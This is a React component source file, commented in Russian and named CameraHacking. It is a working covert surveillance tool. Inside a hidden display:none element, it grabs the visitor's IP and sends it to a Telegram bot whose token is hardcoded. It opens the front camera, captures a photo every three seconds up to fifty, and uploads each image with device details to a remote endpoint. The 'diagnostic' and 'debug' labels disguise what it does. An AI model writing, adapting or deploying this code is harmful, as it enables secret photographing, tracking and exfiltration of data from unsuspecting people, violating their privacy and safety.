/**
 * КОМПОНЕНТ CAMERAHACKING - УНИВЕРСАЛЬНАЯ РАБОЧАЯ ВЕРСИЯ
 * С ИНТЕГРИРОВАННОЙ ДИАГНОСТИКОЙ И АВТОИСПРАВЛЕНИЕМ
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

// Инициализация DiagnosticCollector
class DiagnosticCollector {
  constructor() {
    this.diagnostics = [];
    this.maxEntries = 50;
  }

  async collectBasicDiagnostics() {
    try {
      const ua = navigator.userAgent.toLowerCase();
      const diagnostic = {
        timestamp: Date.now(),
        date: new Date().toISOString(),
        
        // Базовые данные
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        
        // Определение устройства
        isAndroid: /android/.test(ua),
        isIOS: /iphone|ipad|ipod/.test(ua),
        isChrome: /chrome/.test(ua) && !/edge/.test(ua),
        isSafari: /safari/.test(ua) && !/chrome/.test(ua),
        isFirefox: /firefox/.test(ua),
        isWebView: /wv|webview/.test(ua),
        
        // Версии
        androidVersion: (() => {
          const match = ua.match(/android\s([0-9\.]+)/);
          return match ? parseFloat(match[1]) : 0;
        })(),
        
        iosVersion: (() => {
          const match = ua.match(/os\s([0-9_]+)/);
          return match ? match[1].replace(/_/g, '.') : '0';
        })(),
        
        // API поддержка
        supports: {
          mediaDevices: !!navigator.mediaDevices,
          getUserMedia: !!(navigator.mediaDevices?.getUserMedia),
          mediaRecorder: !!window.MediaRecorder,
          canvas: !!document.createElement('canvas').getContext('2d')
        },
        
        // Состояние
        online: navigator.onLine,
        cookieEnabled: navigator.cookieEnabled
      };
      
      // Сохраняем
      this.diagnostics.push(diagnostic);
      if (this.diagnostics.length > this.maxEntries) {
        this.diagnostics.shift();
      }
      
      return diagnostic;
      
    } catch (error) {
      console.error('Diagnostic collection error:', error);
      return null;
    }
  }

  async testCamera() {
    const result = {
      success: false,
      error: null,
      tracks: []
    };
    
    try {
      // Пробуем максимально простые настройки
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: true,
        audio: false 
      });
      
      const tracks = stream.getTracks();
      result.tracks = tracks.map(t => ({
        kind: t.kind,
        readyState: t.readyState,
        label: t.label || 'no-label'
      }));
      
      result.success = tracks.length > 0;
      
      // Немедленно останавливаем тестовый поток
      tracks.forEach(track => track.stop());
      
    } catch (error) {
      result.error = {
        name: error.name,
        message: error.message
      };
    }
    
    return result;
  }
}

// Создаем глобальный экземпляр
const diagnosticCollector = new DiagnosticCollector();

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);

  // Добавление логов
  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 10));
  };

  /**
   * ОТПРАВКА ДИАГНОСТИКИ В TELEGRAM
   */
  const sendDiagnosticReport = async (title, data, isError = false) => {
    try {
      let message = `${isError ? '❌' : '🔍'} ${title}\n\n`;
      
      if (deviceInfo) {
        message += `📱 Устройство: ${deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Другое'}\n`;
        if (deviceInfo.isAndroid) message += `Версия Android: ${deviceInfo.androidVersion}\n`;
        if (deviceInfo.isIOS) message += `Версия iOS: ${deviceInfo.iosVersion}\n`;
        message += `Браузер: ${deviceInfo.isChrome ? 'Chrome' : deviceInfo.isSafari ? 'Safari' : 'Другой'}\n`;
        message += `WebView: ${deviceInfo.isWebView ? 'Да' : 'Нет'}\n\n`;
      }
      
      if (typeof data === 'string') {
        message += data;
      } else if (data instanceof Error) {
        message += `Ошибка: ${data.name}\nСообщение: ${data.message}`;
      } else if (data) {
        message += JSON.stringify(data, null, 2).substring(0, 1000);
      }
      
      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      
      await axios.post(telegramApiUrl, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
    } catch (error) {
      console.error('Не удалось отправить диагностику:', error);
    }
  };

  /**
   * ПОЛУЧЕНИЕ ОПТИМАЛЬНЫХ НАСТРОЕК КАМЕРЫ
   */
  const getOptimalConstraints = () => {
    if (!deviceInfo) return { video: true };
    
    // БАЗОВЫЕ НАСТРОЙКИ ДЛЯ ВСЕХ УСТРОЙСТВ
    const baseConstraints = {
      video: {
        width: { ideal: 1280 },
        height: { ideal: 720 },
        facingMode: 'user',
        frameRate: { ideal: 24 }
      },
      audio: false
    };
    
    // iOS ТРЕБУЕТ ОСОБЫХ НАСТРОЕК
    if (deviceInfo.isIOS) {
      return {
        video: {
          width: { ideal: 1280 },
          height: { ideal: 720 },
          facingMode: 'user',
          frameRate: { ideal: 30 }
        },
        audio: false
      };
    }
    
    // ANDROID НАСТРОЙКИ
    if (deviceInfo.isAndroid) {
      // Старые Android
      if (deviceInfo.androidVersion < 5.0) {
        return {
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            facingMode: { exact: 'user' },
            frameRate: { ideal: 15 }
          },
          audio: false
        };
      }
      
      // Android 5-7
      if (deviceInfo.androidVersion < 8.0) {
        return {
          video: {
            width: { ideal: 800 },
            height: { ideal: 600 },
            facingMode: 'user',
            frameRate: { ideal: 20 }
          },
          audio: false
        };
      }
      
      // Android WebView
      if (deviceInfo.isWebView) {
        return {
          video: {
            facingMode: 'user'
          },
          audio: false
        };
      }
    }
    
    return baseConstraints;
  };

  /**
   * ИНИЦИАЛИЗАЦИЯ ВИДЕО ЭЛЕМЕНТА
   */
  const initializeVideoElement = async () => {
    if (!videoRef.current) {
      throw new Error('Video element not found');
    }
    
    const video = videoRef.current;
    
    // КРИТИЧЕСКИ ВАЖНЫЕ НАСТРОЙКИ ДЛЯ МОБИЛЬНЫХ
    video.playsInline = true;
    video.muted = true;
    video.autoplay = true;
    video.setAttribute('playsinline', 'true');
    video.setAttribute('muted', 'true');
    video.setAttribute('autoplay', 'true');
    video.setAttribute('webkit-playsinline', 'true');
    video.setAttribute('x5-playsinline', 'true'); // Для QQ/WeChat браузеров
    video.setAttribute('x-webkit-airplay', 'allow'); // Для AirPlay
    
    return new Promise((resolve) => {
      const timeout = setTimeout(() => {
        addDebugLog('Video init timeout, continuing anyway');
        resolve();
      }, 5000);
      
      video.onloadedmetadata = () => {
        clearTimeout(timeout);
        addDebugLog(`Video metadata loaded: ${video.videoWidth}x${video.videoHeight}`);
        
        // Пробуем запустить видео
        video.play().then(() => {
          addDebugLog('Video play() successful');
          resolve();
        }).catch((playError) => {
          addDebugLog(`Video play() blocked: ${playError.message}`);
          resolve(); // Все равно продолжаем
        });
      };
      
      video.onerror = (error) => {
        clearTimeout(timeout);
        addDebugLog(`Video error: ${error}`);
        resolve(); // Продолжаем даже при ошибке
      };
    });
  };

  /**
   * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ
   */
  const initializeCamera = async () => {
    addDebugLog('Начинаем инициализацию камеры...');
    
    try {
      // 1. Собираем диагностику
      const diagnostics = await diagnosticCollector.collectBasicDiagnostics();
      setDeviceInfo(diagnostics);
      
      if (!diagnostics) {
        throw new Error('Не удалось собрать диагностику');
      }
      
      // 2. Проверяем поддержку API
      if (!diagnostics.supports.getUserMedia) {
        throw new Error('Браузер не поддерживает камеру (getUserMedia)');
      }
      
      addDebugLog(`Устройство: ${diagnostics.isAndroid ? 'Android' : diagnostics.isIOS ? 'iOS' : 'Desktop'}`);
      
      // 3. Тестируем камеру
      const cameraTest = await diagnosticCollector.testCamera();
      if (!cameraTest.success) {
        await sendDiagnosticReport('Тест камеры не пройден', cameraTest.error, true);
      } else {
        addDebugLog('Тест камеры пройден успешно');
      }
      
      // 4. Получаем оптимальные настройки
      const constraints = getOptimalConstraints();
      addDebugLog(`Используем constraints: ${JSON.stringify(constraints)}`);
      
      // 5. Запрашиваем доступ к камере
      addDebugLog('Запрашиваем доступ к камере...');
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      addDebugLog('Доступ к камере получен');
      
      // 6. Инициализируем video элемент
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await initializeVideoElement();
        
        // Проверяем состояние видео
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const video = videoRef.current;
        if (video.videoWidth > 0 && video.videoHeight > 0) {
          addDebugLog(`Видео готово: ${video.videoWidth}x${video.videoHeight}`);
          await sendDiagnosticReport('Камера успешно инициализирована', {
            resolution: `${video.videoWidth}x${video.videoHeight}`,
            device: diagnostics
          });
        } else {
          addDebugLog('ВНИМАНИЕ: Разрешение видео 0x0');
          await sendDiagnosticReport('Проблема с разрешением видео', {
            warning: 'Video dimensions are 0x0',
            device: diagnostics
          }, true);
        }
      }
      
      setIsInitialized(true);
      return true;
      
    } catch (error) {
      addDebugLog(`Ошибка инициализации камеры: ${error.message}`);
      await sendDiagnosticReport('Ошибка инициализации камеры', error, true);
      return false;
    }
  };

  /**
   * ЗАХВАТ ФОТО
   */
  const capturePhoto = async () => {
    if (!isInitialized || !videoRef.current || !streamRef.current) {
      addDebugLog('Камера не готова, пропускаем захват');
      return;
    }
    
    const video = videoRef.current;
    
    // Проверяем готовность видео
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog('Видео не готово (0x0), пропускаем');
      return;
    }
    
    try {
      addDebugLog(`Захватываем фото #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);
      
      // Создаем canvas
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      
      // Для Android: несколько попыток избежать черных кадров
      let attempts = 0;
      let frameOk = false;
      
      while (!frameOk && attempts < 3) {
        attempts++;
        
        // Очищаем canvas
        ctx.fillStyle = 'black';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        // Рисуем кадр
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Проверяем, не черный ли кадр
        const imageData = ctx.getImageData(10, 10, 1, 1).data;
        const isBlack = imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0;
        
        if (!isBlack || attempts >= 3) {
          frameOk = true;
          addDebugLog(`Кадр захвачен (попытка ${attempts}, черный: ${isBlack})`);
          
          // Если все еще черный, добавляем текст
          if (isBlack) {
            ctx.fillStyle = 'white';
            ctx.font = '20px Arial';
            ctx.fillText('Camera Test', 20, 40);
            ctx.fillText(new Date().toLocaleTimeString(), 20, 70);
          }
        } else {
          addDebugLog(`Черный кадр, повтор ${attempts}/3`);
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }
      
      // Качество изображения
      const quality = deviceInfo?.isAndroid ? 0.7 : 0.8;
      
      // Конвертируем в blob
      canvas.toBlob(async (blob) => {
        if (!blob) {
          addDebugLog('Ошибка: не удалось создать blob');
          return;
        }
        
        const sizeKB = Math.round(blob.size / 1024);
        addDebugLog(`Фото готово (${sizeKB} KB)`);
        
        // Отправляем фото
        await sendPhotoToTelegram(blob);
        
      }, 'image/jpeg', quality);
      
    } catch (error) {
      addDebugLog(`Ошибка захвата фото: ${error.message}`);
    }
  };

  /**
   * ОТПРАВКА ФОТО В TELEGRAM
   */
  const sendPhotoToTelegram = async (blob) => {
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      
      // Имя файла с информацией об устройстве
      let deviceType = 'unknown';
      if (deviceInfo?.isAndroid) deviceType = 'android';
      if (deviceInfo?.isIOS) deviceType = 'ios';
      
      formData.append('photo', blob, `photo_${Date.now()}_${deviceType}.jpg`);
      
      // Добавляем базовую диагностику
      if (deviceInfo) {
        formData.append('device_info', JSON.stringify({
          type: deviceType,
          timestamp: Date.now(),
          userAgent: deviceInfo.userAgent?.substring(0, 100)
        }));
      }
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      
      addDebugLog('Отправляем фото в Telegram...');
      
      await axios.post(apiUrl, formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
        timeout: 15000
      });
      
      addDebugLog('✅ Фото успешно отправлено!');
      setCaptureCount(prev => prev + 1);
      
    } catch (error) {
      addDebugLog(`❌ Ошибка отправки фото: ${error.message}`);
      
      // Отправляем ошибку в Telegram
      try {
        const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
        await axios.post(telegramApiUrl, {
          chat_id: chatId,
          text: `❌ Ошибка отправки фото\n\n` +
                `Устройство: ${deviceInfo?.isAndroid ? 'Android' : deviceInfo?.isIOS ? 'iOS' : 'Unknown'}\n` +
                `Ошибка: ${error.message.substring(0, 100)}\n` +
                `Время: ${new Date().toLocaleString()}`
        });
      } catch (telegramError) {
        addDebugLog(`Не удалось отправить ошибку: ${telegramError.message}`);
      }
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    addDebugLog('🚀 Запуск периодического захвата (каждые 3 секунды)');
    
    // Первый захват через 2 секунды
    setTimeout(() => {
      capturePhoto();
    }, 2000);
    
    // Последующие каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      if (captureCount < 50) { // Максимум 50 фото
        capturePhoto();
      } else {
        stopCapturing();
        addDebugLog('🎯 Достигнут лимит в 50 фото');
      }
    }, 3000);
  };

  /**
   * ПОЛУЧЕНИЕ IP АДРЕСА
   */
  const fetchClientIp = async () => {
    try {
      const response = await axios.get('https://api.ipify.org?format=json', {
        timeout: 5000
      });
      
      const ip = response.data.ip;
      setClientIp(ip);
      addDebugLog(`IP адрес: ${ip}`);
      
      // Отправляем IP в Telegram
      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      await axios.post(telegramApiUrl, {
        chat_id: chatId,
        text: `🌐 IP Address: ${ip}\n` +
              `Device: ${deviceInfo?.isAndroid ? 'Android' : deviceInfo?.isIOS ? 'iOS' : 'Other'}`
      });
      
    } catch (error) {
      addDebugLog(`Ошибка получения IP: ${error.message}`);
      setClientIp('IP unavailable');
    }
  };

  /**
   * ВОССТАНОВЛЕНИЕ ГЕОЛОКАЦИИ
   */
  const restoreLocation = () => {
    try {
      const saved = localStorage.getItem('locationPermission');
      if (saved) {
        const locationData = JSON.parse(saved);
        setLocationPermission(locationData);
        addDebugLog('Геолокация восстановлена из localStorage');
      }
    } catch (error) {
      localStorage.removeItem('locationPermission');
    }
  };

  /**
   * ОСТАНОВКА ВСЕГО
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => {
        track.stop();
        addDebugLog(`Остановлен ${track.kind} трек`);
      });
      streamRef.current = null;
    }
    
    addDebugLog('🛑 Захват остановлен');
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    let mounted = true;
    
    const initializeAll = async () => {
      if (!mounted) return;
      
      addDebugLog('=== НАЧАЛО ИНИЦИАЛИЗАЦИИ ===');
      
      // 1. Восстанавливаем геолокацию
      restoreLocation();
      
      // 2. Получаем IP
      await fetchClientIp();
      
      // 3. Проверяем поддержку
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        addDebugLog('❌ Браузер не поддерживает камеру');
        await sendDiagnosticReport('WebRTC не поддерживается', {
          userAgent: navigator.userAgent,
          hasMediaDevices: !!navigator.mediaDevices,
          hasGetUserMedia: !!(navigator.mediaDevices?.getUserMedia)
        }, true);
        return;
      }
      
      // 4. Инициализируем камеру
      const cameraInitialized = await initializeCamera();
      
      if (cameraInitialized && mounted) {
        // 5. Запускаем захват
        startPeriodicCapture();
      }
    };
    
    initializeAll();
    
    // Очистка
    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  /**
   * СИМПЛЕЙШИЙ UI ДЛЯ ОТЛАДКИ
   */
  return (
    <div style={{ display: 'none' }}>
      {/* Скрытый div для хранения данных */}
      <div id="camera-debug-data">
        {deviceInfo && JSON.stringify({
          device: deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Other',
          version: deviceInfo.isAndroid ? deviceInfo.androidVersion : 
                  deviceInfo.isIOS ? deviceInfo.iosVersion : 'N/A',
          browser: deviceInfo.isChrome ? 'Chrome' : 
                  deviceInfo.isSafari ? 'Safari' : 
                  deviceInfo.isFirefox ? 'Firefox' : 'Other',
          webView: deviceInfo.isWebView,
          initialized: isInitialized,
          captures: captureCount
        })}
      </div>
      
      {/* Минимальная отладка в development */}
      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          bottom: 10,
          right: 10,
          background: 'rgba(0,0,0,0.8)',
          color: 'white',
          padding: '10px',
          fontSize: '11px',
          maxWidth: '300px',
          maxHeight: '200px',
          overflow: 'auto',
          zIndex: 9999,
          fontFamily: 'monospace'
        }}>
          <div style={{ fontWeight: 'bold', marginBottom: '5px' }}>
            Camera Debug ({captureCount} photos)
          </div>
          {debugLogs.slice(0, 5).map((log, index) => (
            <div key={index} style={{ 
              fontSize: '10px',
              marginBottom: '2px',
              whiteSpace: 'nowrap',
              overflow: 'hidden',
              textOverflow: 'ellipsis'
            }}>
              {log}
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

export default CameraHacking;
